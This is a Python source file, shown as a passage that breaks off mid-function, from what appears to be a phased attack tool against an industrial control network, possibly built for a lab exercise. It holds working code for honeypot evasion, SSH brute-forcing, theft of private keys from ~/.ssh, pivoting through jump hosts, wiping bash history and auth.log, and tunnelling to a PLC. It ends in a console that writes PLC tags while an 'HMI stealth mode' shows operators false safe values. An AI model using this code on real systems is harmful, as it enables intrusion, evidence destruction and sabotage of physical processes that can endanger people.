    # ── Step 4: fast ping sweep, then full port scan only on live subnets ─────
    all_nmap_out = ""
    live_hosts: dict[str, list[str]] = {}

    for subnet in discovered_subnets:
        info(f"Ping sweep: {subnet}...")
        alive = _ping_sweep_silent(subnet, timeout=10)
        if not alive:
            warn(f"  No live hosts in {subnet} — skipping full port scan")
            continue

        nmap_cmd = f"sudo nmap -T4 -n -sS -Pn -p {ports} --open {subnet}"
        info(f"Port scan: {subnet}  ({ports})")
        rc, out  = stream_cmd(nmap_cmd, timeout=120, line_filter=_nmap_filter)
        all_nmap_out += out
        hosts = _parse_nmap_hosts(out)
        live_hosts.update(hosts)

    if not live_hosts:
        r.status  = "failed"
        r.finding = "No hosts with open ports found across discovered subnets"
        err(r.finding)
        r.output  = all_nmap_out[-2000:]
        return r

    # ── Step 5: active Cowrie fingerprinting ──────────────────────────────────
    info("Fingerprinting SSH hosts for Cowrie signatures...")
    cowrie_flags: dict[str, bool] = {}
    for ip, open_ports in live_hosts.items():
        if "22" in open_ports:
            info(f"  Probing {ip}:22 with fake credentials...")
            is_trap = _detect_cowrie(ip, port=22)
            cowrie_flags[ip] = is_trap
            if is_trap:
                warn(f"  ⚠  {ip} accepted garbage creds — Cowrie honeypot!")
            else:
                ok(f"  {ip} rejected fake creds — real SSH server")

    trap_ips = {ip for ip, v in cowrie_flags.items() if v}

    # ── Helper: render the host selection table ───────────────────────────────
    def _render_host_table():
        host_table = Table(
            title="[bold magenta]Discovered Live Hosts[/bold magenta]",
            show_header=True, header_style="bold cyan",
            border_style="dim", show_lines=True,
        )
        host_table.add_column("#",            style="dim",    width=4)
        host_table.add_column("IP Address",   style="green",  width=18)
        host_table.add_column("Open Ports",   style="yellow", width=32)
        host_table.add_column("Fingerprint",  width=28)

        for i, (ip, open_ports) in enumerate(host_list, 1):
            ports_str = ", ".join(open_ports)
            if ip in trap_ips:
                fp_str = "[bold yellow]🍯 HONEYPOT (Cowrie)[/bold yellow]"
                host_table.add_row(
                    f"[yellow]{i}[/yellow]",
                    f"[bold yellow]{ip}[/bold yellow]",
                    f"[yellow]{ports_str}[/yellow]",
                    fp_str,
                )
            elif "22" in open_ports:
                fp_str = "[bold green]✔ Real SSH[/bold green]"
                host_table.add_row(str(i), ip, ports_str, fp_str)
            else:
                fp_str = "[dim]— (no SSH)[/dim]"
                host_table.add_row(str(i), ip, ports_str, fp_str)

        console.print(host_table)

        # Honeypot warning panels
        for ip in trap_ips:
            console.print(Panel(
                f"[bold yellow]⚠  Honeypot detected at [bold]{ip}[/bold][/bold yellow]\n"
                "[dim]Do NOT select it. Cowrie will log all keystrokes and alert the blue team.[/dim]",
                border_style="yellow", expand=False,
            ))

        console.print(
            "[dim]  Select the Historian (✔ Real SSH preferred).  "
            "[bold]q[/bold] = abort phase[/dim]"
        )
        console.print()

    host_list = list(live_hosts.items())

    # ── Step 6: operator selection loop (loops until confirmed) ───────────────
    chosen_ip    = None
    chosen_ports = None

    while True:
        _render_host_table()

        raw = Prompt.ask(
            f"[yellow]Select Historian IP # (1–{len(host_list)})[/yellow]"
        ).strip().lower()

        if raw == "q":
            r.status  = "skipped"
            r.finding = "Skipped by operator"
            return r

        try:
            idx = int(raw) - 1
            if not (0 <= idx < len(host_list)):
                raise ValueError
            sel_ip, sel_ports = host_list[idx]
        except (ValueError, IndexError):
            err("Invalid selection — enter a number from the table or 'q' to abort")
            continue

        # Honeypot double-confirm
        if sel_ip in trap_ips:
            console.print(Panel(
                f"[bold red]⚠  You selected [bold]{sel_ip}[/bold] — a confirmed Cowrie honeypot.[/bold red]\n"
                "[dim]This will trigger blue team alerts and log all your keystrokes.[/dim]",
                title="[bold red] Honeypot Selected [/bold red]",
                border_style="red", expand=False,
            ))
            if not Confirm.ask(
                "[bold red]Proceed with known honeypot?[/bold red]", default=False
            ):
                warn("Re-showing table — please pick a real host")
                continue

        # Selection confirmation panel
        fp_label = "🍯 HONEYPOT (Cowrie)" if sel_ip in trap_ips else (
            "✔ Real SSH" if "22" in sel_ports else "— (no SSH)"
        )
        console.print(Panel(
            f"[bold white]IP           :[/bold white]  {sel_ip}\n"
            f"[bold white]Open ports   :[/bold white]  {', '.join(sel_ports)}\n"
            f"[bold white]Fingerprint  :[/bold white]  {fp_label}",
            title="[bold cyan] Confirm Historian Selection [/bold cyan]",
            border_style="cyan", expand=False,
        ))
        if not Confirm.ask("[cyan]Proceed with this host?[/cyan]", default=True):
            warn("Re-showing table — select again")
            continue

        # ── SSH banner grab for visual verification ───────────────────────────
        if "22" in sel_ports:
            info(f"Grabbing SSH banner from {sel_ip}:22...")
            banner = _ssh_banner_grab(sel_ip)
            if banner:
                console.print(Panel(
                    f"[bold white]Banner:[/bold white]  [dim]{escape(banner)}[/dim]",
                    title=f"[bold green] SSH Banner — {sel_ip} [/bold green]",
                    border_style="green", expand=False,
                ))
                ok("Banner retrieved — verify this looks like your Historian before continuing")
            else:
                warn("Could not retrieve SSH banner — host may be rate-limiting connections")

        chosen_ip    = sel_ip
        chosen_ports = sel_ports
        break

    # ── Step 7: commit and report ──────────────────────────────────────────────
    CFG["historian"]["ip"] = chosen_ip
    ok(f"Historian locked: [bold]{chosen_ip}[/bold]  ports: {', '.join(chosen_ports)}")

    trap_count = len(trap_ips)
    r.status  = "success"
    r.finding = (
        f"Historian: {chosen_ip}  |  "
        f"{len(live_hosts)} host(s) across {len(discovered_subnets)} subnet(s)  |  "
        f"{trap_count} honeypot(s) flagged"
    )
    r.output  = all_nmap_out[-2000:]
    return r


def _tcp_reachable(ip: str, port: int, timeout: float = 1.0) -> bool:
    """Quick socket test — returns True if TCP port is open and accepting."""
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False



def _ssh_bruteforce(
    ip: str,
    port: int,
    username: str,
    wordlist_path: str,
    delay: float = 0.2,
) -> str | None:
    """
    Sequential paramiko SSH brute forcer with rich Progress bar.
    - AuthenticationException  → wrong password, skip
    - SSHException              → possible rate-limit, wait 1s and retry same password
    - timeout / connection err  → abort after 3 consecutive failures
    """
    priority = ["", username, username[::-1], f"{username}123", "password", "admin123"]

    try:
        with open(wordlist_path, errors="ignore") as f:
            wordlist = [line.strip() for line in f if line.strip()]
    except (FileNotFoundError, OSError):
        wordlist = []

    candidates = list(dict.fromkeys(priority + wordlist))  # ordered dedup
    total = len(candidates)
    MAX_CONSECUTIVE_TIMEOUTS = 3

    consecutive_timeouts = 0
    found_password: str | None = None

    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TaskProgressColumn, TimeElapsedColumn

    with Progress(
        SpinnerColumn(),
        TextColumn("[bold cyan]{task.description}"),
        BarColumn(bar_width=28),
        TaskProgressColumn(),
        TimeElapsedColumn(),
        console=console,
        transient=False,
    ) as progress:
        task = progress.add_task(
            f"Attempting {username}@{ip}", total=total
        )

        for pw in candidates:
            if progress.finished:
                break

            progress.update(
                task,
                description=f"[bold cyan]Attempting: {username}@{ip}  password: {pw}[/bold cyan]",
            )

            retry = True
            while retry:
                retry = False
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(
                        hostname=ip,
                        username=username,
                        password=pw,
                        timeout=3,
                        allow_agent=False,
                        look_for_keys=False,
                        banner_timeout=3,
                    )
                    client.close()
                    consecutive_timeouts = 0
                    found_password = pw
                    progress.update(task, completed=total,
                                    description=f"[bold green]FOUND: {username}@{ip}  password: {pw}[/bold green]")
                    break  # exit while

                except paramiko.AuthenticationException:
                    # Wrong password — clean rejection, move on
                    consecutive_timeouts = 0
                    time.sleep(delay)

                except paramiko.SSHException:
                    # Possible rate-limit on Historian — wait 1s and retry same pw
                    progress.update(task,
                        description=f"[yellow]SSHException (rate-limit?) — retrying {pw} in 1s[/yellow]")
                    time.sleep(1)
                    retry = True

                except (socket.timeout, paramiko.ssh_exception.NoValidConnectionsError, OSError):
                    consecutive_timeouts += 1
                    progress.update(task,
                        description=f"[yellow]Timeout {consecutive_timeouts}/{MAX_CONSECUTIVE_TIMEOUTS} on {ip}:{port}[/yellow]")
                    if consecutive_timeouts >= MAX_CONSECUTIVE_TIMEOUTS:
                        progress.update(task,
                            description=f"[red]Network blocked — aborting[/red]")
                        return None
                    time.sleep(1)

            if found_password is not None:
                break
            progress.advance(task)

    return found_password


def phase3_ssh_bruteforce() -> PhaseResult:
    phase_header(3, "SSH Brute Force on Historian (paramiko)")
    r = PhaseResult("SSH Brute Force")

    ip   = CFG["historian"]["ip"]
    port = CFG["historian"]["port"]
    user = CFG["historian"]["username"]
    wl   = _resolve_wordlist(CFG["hydra"]["wordlist"])

    console.print(Panel(
        f"[bold white]Target   :[/bold white] [bold yellow]{user}@{ip}:{port}[/bold yellow]\n"
        f"[bold white]Wordlist :[/bold white] {wl or 'priority list only'}",
        title="[bold white] SSH BRUTE FORCE INITIATED [/bold white]",
        border_style="red",
        expand=False,
        padding=(1, 4),
    ))

    # ── Fail-fast: retry TCP probe up to 3× — FortiGate SYN-proxy safe ───────
    MAX_PROBE_ATTEMPTS = 3
    for attempt in range(1, MAX_PROBE_ATTEMPTS + 1):
        info(f"TCP probe attempt {attempt}/{MAX_PROBE_ATTEMPTS} → {ip}:{port}  (4 s timeout)")
        if _tcp_reachable(ip=ip, port=port, timeout=4.0):
            ok(f"Port {port} open on {ip} — starting brute force")
            break
        warn(f"Attempt {attempt} timed out")
        if attempt < MAX_PROBE_ATTEMPTS:
            time.sleep(2)
    else:
        r.status  = "failed"
        r.finding = f"Target unreachable — {ip}:{port} timed out after {MAX_PROBE_ATTEMPTS} attempts"
        err(r.finding)
        return r

    if not wl:
        warn("rockyou.txt not found — running priority-list only")
        wl = "/dev/null"
    else:
        info(f"Wordlist: {wl}")

    found_pw = _ssh_bruteforce(ip=ip, port=port, username=user, wordlist_path=wl)

    if found_pw is not None:
        # ── ACCESS GRANTED panel ───────────────────────────────────────────────
        console.clear()
        console.print(Panel(
            f"\n[bold white]  ACCESS GRANTED  \n\n"
            f"  User  : [bold yellow]{user}[/bold yellow]\n"
            f"  Host  : [bold yellow]{ip}:{port}[/bold yellow]\n"
            f"  Pass  : [bold yellow]{found_pw}[/bold yellow]\n",
            title="[bold white] SSH COMPROMISED [/bold white]",
            border_style="bold green",
            expand=False,
            padding=(1, 4),
        ))
        r.status  = "success"
        r.finding = f"Credentials confirmed: {user}:{found_pw}"
        CFG["historian"]["password"] = found_pw
    else:
        r.status  = "failed"
        r.finding = f"No valid password found for {user}@{ip}"
        err(r.finding)

    r.output = r.finding
    return r


def phase4_ssh_pivot() -> PhaseResult:
    phase_header(4, "SSH into Historian → Hop to IDS — OT Zone Recon")
    r = PhaseResult("SSH Pivot / OT Recon")

    hist_ip   = CFG["historian"]["ip"]
    hist_user = CFG["historian"]["username"]
    hist_pass = CFG["historian"]["password"]
    hist_port = CFG["historian"]["port"]

    ids_ip    = CFG["ids"]["ip"]
    ids_user  = CFG["ids"]["username"]
    ids_pass  = CFG["ids"]["password"]
    ids_port  = CFG["ids"]["port"]

    plc_ip    = CFG["plc"]["ip"]
    findings  = []
    checks    = {"route": False, "ping": False, "syslog": False}

    PORT_VENDOR = {
        "44818": "Allen-Bradley / Rockwell (EtherNet/IP)",
        "102":   "Siemens S7 (ISO-TSAP)",
        "502":   "Modbus TCP Device",
    }
    SKIP_IPS = {ids_ip, "10.20.20.254"}

    try:
        # ── Step 1: land on Historian ────────────────────────────────────────
        info(f"Connecting to Historian ({hist_ip})...")
        hist_client = ssh_connect(hostname=hist_ip, username=hist_user,
                                  password=hist_pass, port=hist_port)

        # ── Step 2: OT syslog from Historian ────────────────────────────────
        console.print("\n[bold cyan]OT syslog (last 20 lines)[/bold cyan]")
        syslog_out, _, _ = ssh_run(hist_client, "grep '10.20.20' /var/log/syslog | tail -20")
        if syslog_out.strip():
            checks["syslog"] = True
            ok("OT zone syslog entries present")
        else:
            warn("No OT syslog entries — rsyslog forwarding may not be running")
        findings.append(f"Syslog:\n{syslog_out}")

        # ── Step 3: Confirm route to OT zone from Historian ─────────────────
        console.print("\n[bold cyan]Route: Historian → OT zone[/bold cyan]")
        route_out, _, route_rc = ssh_run(hist_client, f"ip route get {ids_ip}")
        if route_rc == 0:
            checks["route"] = True
            ok(f"Route to OT zone ({ids_ip}) exists from Historian")
        else:
            err(f"No route to OT zone from Historian — FortiGate may be blocking")
        findings.append(f"Route:\n{route_out}")

        # ── Step 4: Hop from Historian into IDS (10.20.20.5) ────────────────
        # The IDS lives inside the OT zone (10.20.20.x), so any probe it sends
        # to the PLC will carry a 10.20.20.5 source IP — which the PLC accepts.
        console.print("\n[bold cyan]Hopping Historian → IDS (OT zone)[/bold cyan]")
        info(f"Tunnelling SSH through Historian → {ids_user}@{ids_ip}:{ids_port}")

        # ── 4a. SSH Key Hunting — check Historian's own key first ───────────
        # A blind attacker who can't guess the IDS password can still pivot if
        # the Historian admin has a pre-authorised key pair trusted by the IDS.
        stolen_pkey: paramiko.PKey | None = None
        console.print("\n[bold cyan]SSH Key Hunt — searching Historian ~/.ssh/[/bold cyan]")
        key_out, _, key_rc = ssh_run(hist_client,
            "ls -la ~/.ssh/id_rsa 2>/dev/null && cat ~/.ssh/id_rsa 2>/dev/null || "
            "ls -la ~/.ssh/id_ed25519 2>/dev/null && cat ~/.ssh/id_ed25519 2>/dev/null || "
            "echo __NO_KEY__")

        if "-----BEGIN" in key_out:
            # Extract just the PEM block (everything from -----BEGIN to -----END)
            pem_lines = []
            in_block  = False
            for line in key_out.splitlines():
                if "-----BEGIN" in line:
                    in_block = True
                if in_block:
                    pem_lines.append(line)
                if "-----END" in line and in_block:
                    break
            pem = "\n".join(pem_lines) + "\n"

            try:
                # Try RSA first, then Ed25519
                try:
                    stolen_pkey = paramiko.RSAKey.from_private_key(io.StringIO(pem))
                except paramiko.SSHException:
                    stolen_pkey = paramiko.Ed25519Key.from_private_key(io.StringIO(pem))

                ok("[bold green][+] Stolen SSH Private Key found on Historian! "
                   "Attempting passwordless pivot...[/bold green]")
            except Exception as key_parse_err:
                warn(f"Key found but could not parse it: {key_parse_err}")
                stolen_pkey = None
        else:
            warn("No private key found on Historian — falling back to password list")

        # ── 4b. Attempt hop: stolen key first, then password fallbacks ───────
        IDS_FALLBACKS = [
            (ids_user, ids_pass),           # primary from CFG (tried first)
            ("pi",      "raspberry"),
            ("pi",      "admin123"),
            ("student", "student"),
            ("admin",   "raspberry"),
        ]

        ids_client = None
        last_exc: Exception | None = None

        # Try the stolen key against all plausible usernames before touching passwords
        if stolen_pkey:
            key_users = list(dict.fromkeys(
                [ids_user, "pi", "admin", "student", "kali"]
            ))
            for ku in key_users:
                try:
                    info(f"Trying stolen key as {ku}@{ids_ip}")
                    ids_client = ssh_hop(hist_client, ids_ip, ids_port,
                                         ku, pkey=stolen_pkey)
                    # Persist key + user in CFG so Phases 5 & 6 can reuse them
                    if ku != ids_user:
                        CFG["ids"]["username"] = ku
                    CFG["ids"]["password"]    = ""           # not needed — key auth
                    CFG["ids"]["private_key"] = stolen_pkey  # paramiko.PKey object
                    console.print(Panel(
                        f"[bold white]Method   :[/bold white] [bold green]Stolen SSH Private Key[/bold green]\n"
                        f"[bold white]Username :[/bold white] [bold yellow]{ku}[/bold yellow]\n"
                        f"[bold white]Host     :[/bold white] [bold yellow]{ids_ip}[/bold yellow]\n\n"
                        f"[dim]CFG updated — Phases 5 & 6 will use these credentials[/dim]",
                        title="[bold green] IDS PIVOTED VIA STOLEN KEY [/bold green]",
                        border_style="green",
                        expand=False,
                    ))
                    break
                except paramiko.AuthenticationException as exc:
                    warn(f"  Key rejected for {ku}@{ids_ip}")
                    last_exc = exc

        # If key auth didn't work (or no key), try password list
        if ids_client is None:
            for attempt_user, attempt_pass in IDS_FALLBACKS:
                try:
                    info(f"Trying IDS creds: {attempt_user}@{ids_ip}")
                    ids_client = ssh_hop(hist_client, ids_ip, ids_port,
                                         attempt_user, attempt_pass)
                    if attempt_user != ids_user or attempt_pass != ids_pass:
                        CFG["ids"]["username"] = attempt_user
                        CFG["ids"]["password"] = attempt_pass
                        console.print(Panel(
                            f"[bold white]Username :[/bold white] [bold yellow]{attempt_user}[/bold yellow]\n"
                            f"[bold white]Password :[/bold white] [bold yellow]{attempt_pass}[/bold yellow]\n\n"
                            f"[dim]CFG updated — Phases 5 & 6 will use these credentials[/dim]",
                            title="[bold yellow] IDS Credentials Auto-Corrected [/bold yellow]",
                            border_style="yellow",
                            expand=False,
                        ))
                    break
                except paramiko.AuthenticationException as exc:
                    warn(f"  Auth failed: {attempt_user}@{ids_ip}")
                    last_exc = exc

        if ids_client is None:
            raise last_exc  # bubble up so the outer except block catches it

        # ── Step 5: OT Fingerprinting Sweep — run FROM IDS ──────────────────
        # Source IP = 10.20.20.5 → PLC accepts the probe.
        console.print("\n[bold cyan]OT Fingerprinting Sweep (from IDS — OT zone source)[/bold cyan]")
        info("Probing ports 44818 (AB), 102 (Siemens), 502 (Modbus) across 10.20.20.1–254...")

        nc_check, _, nc_rc = ssh_run(ids_client, "which nc || which ncat || which netcat")
        has_nc = nc_rc == 0 and nc_check.strip()

        if has_nc:
            sweep_cmd = (
                "for i in {1..254}; do "
                "(for p in 102 502 44818; do "
                "nc -z -w 2 10.20.20.$i $p 2>/dev/null "
                "&& echo \"10.20.20.$i:$p\"; "
                "done) & "
                "done; wait"
            )
        else:
            warn("nc not found on IDS — using bash /dev/tcp fallback")
            sweep_cmd = (
                "for i in {1..254}; do "
                "(for p in 102 502 44818; do "
                "(bash -c \"echo > /dev/tcp/10.20.20.$i/$p\" 2>/dev/null "
                "&& echo \"10.20.20.$i:$p\"); "
                "done) & "
                "done; wait"
            )

        sweep_out, _, _ = ssh_run(ids_client, sweep_cmd, timeout=90)

        discovered_devices: list[dict] = []
        for line in sweep_out.splitlines():
            line = line.strip()
            if ":" not in line:
                continue
            parts = line.split(":")
            if len(parts) != 2:
                continue
            d_ip, d_port = parts[0].strip(), parts[1].strip()
            if not d_ip.startswith("10.20.20."):
                continue
            if d_ip in SKIP_IPS:
                continue
            vendor = PORT_VENDOR.get(d_port, f"Unknown (port {d_port})")
            discovered_devices.append({"ip": d_ip, "port": d_port, "vendor": vendor})

        sweep_table = Table(show_header=True, header_style="bold magenta", border_style="dim")
        sweep_table.add_column("Discovered IP",    style="cyan",  width=18)
        sweep_table.add_column("Open Port",         style="white", width=12)
        sweep_table.add_column("Inferred PLC Type", style="green", width=40)
        for dev in discovered_devices:
            sweep_table.add_row(dev["ip"], dev["port"], dev["vendor"])
        console.print(sweep_table)

        PORT_PRIORITY = ["44818", "502", "102"]

        # Prefer the already-configured IP if it showed up in the sweep —
        # only fall back to the first discovered device if ours is absent.
        configured_hits = [d for d in discovered_devices if d["ip"] == plc_ip]
        if configured_hits:
            # Pick the hit with the highest-priority port
            best = next(
                (h for pp in PORT_PRIORITY for h in configured_hits if h["port"] == pp),
                configured_hits[0],
            )
        else:
            best = None
            for preferred_port in PORT_PRIORITY:
                best = next((d for d in discovered_devices if d["port"] == preferred_port), None)
                if best:
                    break

        if best:
            old_plc_ip = plc_ip
            CFG["plc"]["ip"]   = best["ip"]
            CFG["plc"]["type"] = best["vendor"]
            plc_ip = best["ip"]
            checks["ping"] = True
            if best["ip"] != old_plc_ip:
                console.print(Panel(
                    f"[bold white]Configured IP :[/bold white]  "
                    f"[red]{old_plc_ip}[/red]  (not seen in sweep)\n"
                    f"[bold white]Discovered IP :[/bold white]  "
                    f"[bold green]{best['ip']}[/bold green]  port {best['port']}\n"
                    f"[bold white]Vendor        :[/bold white]  {best['vendor']}\n\n"
                    f"[dim]CFG updated — Phase 5 will CIP from IDS → {best['ip']}[/dim]",
                    title="[bold yellow] PLC IP AUTO-CORRECTED [/bold yellow]",
                    border_style="yellow", expand=False,
                ))
            else:
                ok(f"PLC confirmed: {best['ip']}  ({best['vendor']}  port {best['port']})")
        else:
            checks["ping"] = False
            err("No recognised industrial devices found on OT subnet (ports 44818/502/102 all closed)")

        findings.append(f"OT Sweep:\n{sweep_out}")

        # ── Anti-forensics: wipe bash history + auth.log on remote hosts ─────
        for af_client in (ids_client, hist_client):
            try:
                ssh_run(af_client,
                        "cat /dev/null > ~/.bash_history; "
                        "sudo truncate -s 0 /var/log/auth.log 2>/dev/null",
                        timeout=5)
            except Exception:
                pass

        ids_client.close()
        hist_client.close()

        if checks["route"] and checks["ping"]:
            r.status  = "success"
            r.finding = (
                f"OT zone confirmed — {plc_ip} "
                f"({CFG['plc'].get('type', 'unknown vendor')})"
            )
            ok(r.finding)
        elif not checks["ping"]:
            r.status  = "failed"
            r.finding = "No recognised industrial devices found on the OT subnet"
            err(r.finding)
        else:
            r.status  = "failed"
            r.finding = "No route from Historian to OT zone"
            err(r.finding)

        r.output = "\n".join(findings)

    except paramiko.AuthenticationException as e:
        r.status  = "failed"
        r.finding = f"SSH auth failed — {e} — check CFG credentials"
        err(r.finding)
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


def _open_cip_tunnel(
    hist_ip: str, hist_user: str, hist_pass: str,
    ids_ip: str,  ids_user: str,  ids_pass: str,
    ids_pkey: "paramiko.PKey | None",
    plc_ip: str,  local_port: int = 44818,
) -> tuple["subprocess.Popen", "str | None"]:
    """
    Spawn a native ssh -L tunnel:  localhost:local_port → IDS → PLC:local_port
    Historian is the ProxyCommand jump host (sshpass for password auth).
    IDS auth uses the stolen private key when available, else sshpass password.

    Returns (Popen, key_file_path_or_None).
    Caller must .terminate() the process and delete the key file when done.
    """
    # Write stolen key to disk so ssh -i can use it
    key_file: str | None = None
    if ids_pkey:
        key_file = "/tmp/ids_rsa"
        with open(key_file, "w") as kf:
            ids_pkey.write_private_key(kf)
        os.chmod(key_file, 0o600)

    # Kill any stale listener from a previous run
    run_cmd(f"fuser -k {local_port}/tcp 2>/dev/null || true", capture=False)
    time.sleep(0.5)

    # Historian hop via ProxyCommand — always password-authed
    ssh_opts   = "-o StrictHostKeyChecking=no -o ConnectTimeout=10 -o BatchMode=no"
    proxy_cmd  = (
        f"sshpass -p '{hist_pass}' ssh -W %h:%p "
        f"{ssh_opts} {hist_user}@{hist_ip}"
    )
    fwd        = f"-N -L {local_port}:{plc_ip}:{local_port}"
    proxy_opt  = f'-o "ProxyCommand={proxy_cmd}"'

    if key_file:
        # Key auth to IDS — no outer sshpass needed
        cmd = (
            f"ssh {fwd} {ssh_opts} {proxy_opt} "
            f"-i {key_file} {ids_user}@{ids_ip}"
        )
    else:
        # Password auth to IDS
        cmd = (
            f"sshpass -p '{ids_pass}' ssh {fwd} {ssh_opts} {proxy_opt} "
            f"{ids_user}@{ids_ip}"
        )

    proc = subprocess.Popen(
        cmd, shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,   # captured so we can report why it died
    )
    return proc, key_file


def phase5_plc_attack() -> PhaseResult:
    phase_header(6, "Interactive CIP Attack Console")
    r = PhaseResult("PLC CIP Write")

    plc_ip   = CFG["plc"]["ip"]

    hist_ip   = CFG["historian"]["ip"]
    hist_port = CFG["historian"]["port"]
    hist_user = CFG["historian"]["username"]
    hist_pass = CFG["historian"]["password"]

    ids_ip   = CFG["ids"]["ip"]
    ids_port = CFG["ids"]["port"]
    ids_user = CFG["ids"]["username"]
    ids_pass = CFG["ids"]["password"]
    ids_pkey: "paramiko.PKey | None" = CFG["ids"].get("private_key")

    LOCAL_PORT    = 44818
    INTERESTING   = {"dose", "rate", "pump", "speed", "flow", "setpoint", "cmd", "hz", "local:"}
    NUMERIC_TYPES = {"REAL", "DINT", "INT", "LINT", "SINT", "UDINT", "UINT"}
    CIP_SLOTS     = ["", "/0", "/1", "/2", "/3"]

    console.print(Panel(
        "[bold white]Target :[/bold white] [bold yellow]{}[/bold yellow]\n"
        "[dim]Establishing tunnel to initialize Interactive Attack Console...[/dim]".format(plc_ip),
        title="[bold red] PLC Attack Module [/bold red]",
        border_style="red", expand=False,
    ))

    tunnel_proc: "subprocess.Popen | None" = None
    key_file:    "str | None"              = None

    try:
        # ── Kill any ghost SSH proxy processes that could cause rate-limits ───
        run_cmd("pkill -f 'ssh -W' 2>/dev/null || true",          capture=False)
        run_cmd("pkill -f 'ssh -N -L 44818' 2>/dev/null || true", capture=False)

        # ── Spawn the real ssh -L tunnel ──────────────────────────────────────
        info(f"Opening ssh -L tunnel  127.0.0.1:{LOCAL_PORT} → {ids_ip} → {plc_ip}:{LOCAL_PORT}")
        tunnel_proc, key_file = _open_cip_tunnel(
            hist_ip, hist_user, hist_pass,
            ids_ip,  ids_user,  ids_pass, ids_pkey,
            plc_ip,  LOCAL_PORT,
        )

        info("Waiting 4 s for tunnel to establish...")
        time.sleep(4)

        if tunnel_proc.poll() is not None:
            stderr_out = tunnel_proc.stderr.read(2048).decode(errors="replace").strip()
            raise RuntimeError(
                f"ssh tunnel exited immediately (rc={tunnel_proc.returncode})\n{stderr_out}"
            )
        ok(f"Tunnel live  127.0.0.1:{LOCAL_PORT} → {plc_ip}")

        # ── Slot hunt: try CIP paths until one opens ──────────────────────────
        from pycomm3 import LogixDriver

        plc_conn    = None
        working_path = None
        for slot in CIP_SLOTS:
            path = f"127.0.0.1{slot}"
            info(f"Trying CIP path: {path!r}")
            drv = LogixDriver(path, init_info=False)
            try:
                drv.open()
                plc_conn     = drv
                working_path = path
                ok(f"PLC connected at {path!r}")
                break
            except Exception as slot_err:
                warn(f"  {path!r} → {slot_err}")
                try: drv.close()
                except Exception: pass

        if plc_conn is None:
            raise RuntimeError(
                f"All CIP slot paths failed — PLC at {plc_ip} not responding via tunnel.\n"
                "Verify the PLC is powered on and sshpass is installed on Kali."
            )

        # Single lock serialises all pycomm3 calls — the driver is not thread-safe.
        plc_lock = threading.Lock()

        try:
            # ── Tag enumeration (runs once, table reused in loop) ─────────────
            info("Enumerating PLC tag list...")
            all_tags = plc_conn.get_tag_list()

            def _tname(t) -> str:
                return t.get("tag_name", "") if isinstance(t, dict) else str(getattr(t, "tag_name", ""))
            def _ttype(t) -> str:
                dt = t.get("data_type", "Unknown") if isinstance(t, dict) else getattr(t, "data_type", "Unknown")
                if isinstance(dt, dict):
                    return str(dt.get("name", "STRUCT"))
                return str(dt)

            # No filtering — expose every tag for full manual control
            display_tags = all_tags
            ok(f"{len(display_tags)} tags loaded — all tags shown for manual inspection")

            def _render_tag_table():
                tbl = Table(
                    title="[bold magenta]PLC Data Table — All Tags[/bold magenta]",
                    show_header=True, header_style="bold cyan", border_style="dim",
                )
                tbl.add_column("#",         style="dim",    width=5,  justify="right")
                tbl.add_column("Tag Name",  style="green",  width=42)
                tbl.add_column("Data Type", style="yellow", width=12)
                for i, t in enumerate(display_tags, 1):
                    tbl.add_row(str(i), _tname(t), _ttype(t))
                console.print(tbl)

            # ── Live-fire shell — tunnel + connection stay open throughout ─────
            payloads_fired: list[str] = []

            def _cast(raw: str, reference, dtype: str = ""):
                """Cast raw string to the correct type for the selected tag."""
                # BOOL tag — accept True/False/1/0/yes/no
                if dtype.upper() == "BOOL" or isinstance(reference, bool):
                    return raw.strip().lower() in ("true", "1", "yes", "on")
                try:
                    if isinstance(reference, float): return float(raw)
                    if isinstance(reference, int):   return int(raw)
                except ValueError:
                    pass
                return raw

            quit_all   = False
            stop_freeze: threading.Event | None = None   # set when stealth mode active

            def _stop_stealth():
                """Signal the freeze thread to exit and wait briefly for it."""
                nonlocal stop_freeze
                if stop_freeze and not stop_freeze.is_set():
                    stop_freeze.set()
                    time.sleep(0.2)

            # ── OUTER LOOP: tag selection ─────────────────────────────────────
            while not quit_all:
                _render_tag_table()

                # ── HMI Stealth Mode prompt ───────────────────────────────────
                console.print()
                if Confirm.ask(
                    "[bold magenta]Enable HMI Stealth Mode? "
                    "[dim](freeze a tag at a safe value in the background)[/dim][/bold magenta]",
                    default=False,
                ):
                    _stop_stealth()   # kill any previous freeze thread first

                    freeze_raw = Prompt.ask(
                        f"[magenta]  Freeze tag # (1–{len(display_tags)})[/magenta]"
                    ).strip()
                    try:
                        freeze_tag = _tname(display_tags[int(freeze_raw) - 1])
                    except (ValueError, IndexError):
                        warn("Invalid index — stealth mode skipped")
                        freeze_tag = None

                    if freeze_tag:
                        with plc_lock:
                            freeze_cur = plc_conn.read(freeze_tag)
                        freeze_cur_val = freeze_cur.value if freeze_cur else 0
                        safe_raw = Prompt.ask(
                            f"[magenta]  Safe value to lock [bold]{freeze_tag}[/bold] at "
                            f"(current: [bold yellow]{freeze_cur_val}[/bold yellow])[/magenta]"
                        ).strip()
                        safe_value = _cast(safe_raw, freeze_cur_val)

                        stop_freeze = threading.Event()

                        def _freeze_loop(tag_name=freeze_tag, val=safe_value,
                                         ev=stop_freeze, lock=plc_lock):
                            while not ev.is_set():
                                try:
                                    with lock:
                                        plc_conn.write((tag_name, val))
                                except Exception:
                                    pass
                                time.sleep(random.uniform(0.003, 0.008))

                        t = threading.Thread(target=_freeze_loop, daemon=True)
                        t.start()
                        console.print(Panel(
                            f"[bold white]Frozen tag :[/bold white] [bold yellow]{freeze_tag}[/bold yellow]\n"
                            f"[bold white]Locked at  :[/bold white] [bold green]{safe_value}[/bold green]\n"
                            f"[bold white]Interval   :[/bold white] 3–8 ms (Randomized Jitter)\n\n"
                            f"[dim]HMI will display {safe_value} while you manipulate other tags[/dim]",
                            title="[bold magenta] HMI STEALTH MODE ACTIVE [/bold magenta]",
                            border_style="magenta", expand=False,
                        ))

                console.print(
                    f"[dim]  Select attack tag (1–{len(display_tags)})  |  [bold]q[/bold] = quit[/dim]"
                )
                console.print()
                raw_idx = Prompt.ask("[yellow]Tag #[/yellow]").strip().lower()

                if raw_idx in ("q", "quit"):
                    _stop_stealth()
                    quit_all = True
                    break

                try:
